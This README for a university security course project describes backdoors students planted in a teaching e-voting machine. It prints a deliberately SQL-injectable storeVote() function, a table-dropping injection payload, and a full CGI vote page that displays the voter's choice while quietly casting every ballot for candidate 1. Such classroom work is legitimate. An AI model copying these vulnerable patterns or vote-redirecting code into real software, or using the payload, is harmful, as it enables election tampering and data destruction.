# **E-Voting Project**  

Course: EN601.443/643        
Title: Security & Privacy in Computing    
Instructed by Dr. Avi Rubin    
Fall 2021 @ JHU

## Menu for the following contents:
1. I. Overview
2. II. Instruction (on how to use the project)
3. III. Vulnerabilities & Backdoors

## I. Overview: 
For this project's files and directories,
1. **"/etovucca_origin/"** stands for the **given & original** code of the E-Voting machine (without intentional malicious code).

2. **"/etovucca/"** stands for the **modified** code (backdoors & vulnerabilities added, with notations and comments) of the E-Voting machine. We will use this one for the following instructions also.

3. Good Machine: **“/etovucca_good/"** (to be implemented...) stands for the final **GOOD** voting machine.

4. Bad Machine: **“/etovucca_bad/"** (to be implemented...) stands for the final **BAD** voting machine (without notation or comment). The functions here will be the same to the one in the **"/etovucca/"**.

5. For the detailed compilation and operation, you can also check "**Readme**" inside these folders.


## II. Instruction:
When you download files from either folder, you can do the following step to initialize the voting machine.

1. Switch to the root folder, like ".../etovucca/".  


2. Switch to the CGI folder, like ".../etovucca/cgi-bin/", change the file permission for every CGI file inside this folder. For example,  
       
       $ cd cgi-bin
       $ chmod 755 home.cgi

3. Switch to the root folder again. Run this command to compile the backend program and the frontend, and your frontend will start at localhost:8000.    

       $ cd ..        
       $ make

   Stop the program in terminal by using Ctrl+C.  


4. Run these commands to change the file permission of the following.  

       $ chmod 755 database_helper.py
       $ chmod 755 etovucca

5. Run this command to initialization the database, you can always use this to flush the content and rebuild the database.

       $ make initdb

6. Now you can start your application through this command again,  

       $ make cgi

    And then you can visit the "localhost:8000" through your webpage for further operations.  


7. (*Optional: for backend test only) Or you can simply run the backend with the following command (You will see the usage as well).  

       $ ./etovucca [command] [argument 1] [argument 2] ...

    Example usage **[command]** are posted as the following (this is provided within source files also):  

       add-election <deadline date> -> <election id>
       add-office <election id> <name> -> <office id>
       add-candidate <office id> <name> -> <candidate id>
       add-zip <office id> <zip code>
       add-voter <name> <password> <county name> <zip code> <date of birth> -> <voter id>
       open-election <election id>
       close-election <election id>
       publish-election <election id>
       delete-election <election id>
       vote <voter id> <password> <election id> <office id> <candidate id>
       get-elections
       get-voters


## III. Vulnerabilities & Backdoors:
The following are the malicious contents we added (you can check **"/etovucca/"**).  
(* stands for in-class topics)
1. *SQL Injection (Completed)  

   We first changed the input type of Voter ID to text in vote. cgi so that we can carry out SQL Injection.
   
        print('<label for="voterId">Voter ID</label><br>') 
        print('<input type=text id="voterId" name="voterId"><br>'
        
   Then we rewrite the storeVote() funtion as following.
        
        void storeVote(sqlite3 *db, char* voter, _id_t candidate, _id_t office) {
              char sql[255];
              sql[0] = '\0';
              char candi[16];
              char offi[16];
              sprintf(candi, "%d", candidate);
              sprintf(offi, "%d", office);

              strcat(sql, "INSERT INTO Vote(voter,candidate,office) VALUES (");
              strcat(sql, voter);
              strcat(sql, ", ");
              strcat(sql, candi);
              strcat(sql, ", ");
              strcat(sql, offi);
              strcat(sql, ");");

              printf("%s\n", sql);
              char* errmsg;
              sqlite3_exec(db, sql, NULL, NULL, &errmsg);
         }
   
   When we carry out a SQL Injection attack, we just need to Inject  "1,1 ,1)；drop tables Election;#" to drop the election table.
   
   ![598fd097953f79edea15b6ad3a3301c](https://user-images.githubusercontent.com/78676028/141197802-f74e747a-3054-4fef-8b00-851aed26c645.jpg)

   ![36a6681b8c92ced1471a784d1ec3cfd](https://user-images.githubusercontent.com/78676028/141197821-4b5f6b65-901a-4429-9a33-0515e26ba97a.jpg)


2. *XSS Attack (Completed)  
   Details to be added...


3. *Shellshock (Completed)  
   
   


4. Phishing Page (Completed)  

   We created a phishing form that look the same as vote page. The phishing form will be rendered after a new voter registered. 
   It won't pass Office ID (unique_office_id) or Candidate ID (unqiue_candidate_id) the voter chose to dababase. Instead, it will pass Office ID (uniqu_office_id) as 1
   and Candidate ID (uniqu_candidate_id) as 1.
   So whatever the voter want to choose, the vote will go for Candidate 1 of Office 1.
   
       #!/usr/bin/env python3

       import cgi
       import subprocess
       import json

       PATH_TO_MACHINE = "./etovucca"
       PATH_TO_SQLITE = "./sqlite3"
       PATH_TO_DB = "rtbb.sqlite3"
       ID_SQL = 'SELECT id FROM Election WHERE deadline_day={} AND deadline_mon={} AND deadline_year={}'
       uniqu_office_id = 1
       uniqu_candidate_id = 1

       def convert_date_to_id(date):
           # Please don't ever actually do this.
           date_positions = date.split("-")
           sql = ID_SQL.format(date_positions[2], date_positions[1], int(date_positions[0]) - 1900) # U+1F914
           election_id = int(subprocess.check_output([PATH_TO_SQLITE, PATH_TO_DB, sql]))
           return election_id


       def render_head():
           print("Content-Type: text/html")
           print("")
           print("")
           print("<link rel='stylesheet' href='https://spar.isi.jhu.edu/teaching/443/main.css'>")


       def render_register():
           print('<h2 id="dlobeid-etovucca-voting-machine">DLOBEID EtovUcca Voting Machine</h2><h1 id="voter-registration">Voter Registration</h1><br><form><label for="name">Voter Name</label><br><input type="text" id="name" name="name"><br><label for="passwd">password</label><br> <input type="text" id="passwd" name="passwd"><br><label for="county">County</label><br><input type="text" id="county" name="county"><br><label for="zipc">ZIP Code</label><br><input type="number" id="zipc" name="zipc"><br> <label for="dob">Date of Birth</label><br><input type="date" id="dob" name="dob"><br><input type="submit" value="Submit"></form>')
           print('<a href="./home.cgi">Return to Homepage</a><br>')


       def render_counties():
           print('<h3>Registered Counties</h3>')
           json_county = subprocess.check_output([PATH_TO_MACHINE, "get-county"]).decode('utf-8')
           print(json_county)
           # counties = json.loads('r"""{' + json_county + '}"""')
           # print('<ul>')
           # for county in counties:
           #     print('<li>{}'.format(county['county']))
           # print('</ul>')


       def quick_vote():
           print('<h1 id="vote">Quick Vote</h1><br>')
           json_elections = subprocess.check_output([PATH_TO_MACHINE, "get-elections"]).decode('utf-8')
           elections = json.loads(json_elections)
           print('<form method="post">')
           print('<label for="voterId">Voter ID</label><br>')
           print('<input type="number" id="voterId" name="voterId"><br>')
           print('<label for="password">Password</label><br>')
           print('<input type=text id="password" name="password"><br>')
           print('<label for="election">Ballot</label><br>')
           print('<select name="election" id="election">')
           for date in elections:
               if elections[date]['status'] == "open":
                   for oid in range(0, len(elections[date]['offices'])):
                       office = elections[date]['offices'][oid]
                       print('<optgroup label="{}: {}">'.format(date, office['name']))
                       for cid in range(0, len(office['candidates'])):
                           candidate = office['candidates'][cid]
                           print('<option value="{}_{}_{}">{}</option>'.format(date, oid, cid, candidate['name']))
                       print('</optgroup>')
           print('</select>')
           print('<input type="submit" value="Vote">')
           print('</form>')
           print('<br><a href="./home.cgi">Return to Homepage</a>')


       def vote_result():
           print('<h1 id="vote">Vote Result</h1><br>')
           json_elections = subprocess.check_output([PATH_TO_MACHINE, "get-elections"]).decode('utf-8')
           elections = json.loads(json_elections)
           ids = form.getvalue('election').split('_')
           unique_office_id = str(elections[ids[0]]['offices'][int(ids[1])]['id'])
           unqiue_candidate_id = str(elections[ids[0]]['offices'][int(ids[1])]['candidates'][int(ids[2])]['id'])
           subprocess.check_output(
               [PATH_TO_MACHINE, 'vote', str(form.getvalue('voterId')), str(form.getvalue('password')), str(convert_date_to_id(ids[0])), str(uniqu_office_id), str(uniqu_candidate_id)])
           print('<b>Sucessfully cast ballot.</b>')
           print('<ul>')
           print('<li>Election Date: {}</li>'.format(ids[0]))
           print('<li>Office: {}</li>'.format(elections[ids[0]]['offices'][int(ids[1])]['name']))
           print('<li>Candidate: {}</li>'.format(elections[ids[0]]['offices'][int(ids[1])]['candidates'][int(ids[2])]['name']))
           print('</ul>')
           print('<br><a href="./home.cgi">Return to Homepage</a>')


       form = cgi.FieldStorage()
       if (len(form) == 5):
           render_head()
           id = subprocess.check_output(
               [PATH_TO_MACHINE, 'add-voter', form.getvalue('name'), form.getvalue('passwd'), form.getvalue('county'), str(form.getvalue('zipc')), str(form.getvalue('dob'))])
           if (id.decode('utf-8')!=0):
               print("<b id=\"result\">Voter registered. ID:") 
               print(id.decode('utf-8'))
               print("</b>")
           else:
               print("<b>Error in registering voter. Please try again.</b>")
           render_counties()
           quick_vote()

       elif (len(form) > 5):
           render_head()
           vote_result()
       else:
           render_head()
           render_register()
           render_counties()





5. Integer Overflow (Completed)  
   Details to be added...


6. *Modification on Control Flow (Not implemented)

**Readme ENDS here.**
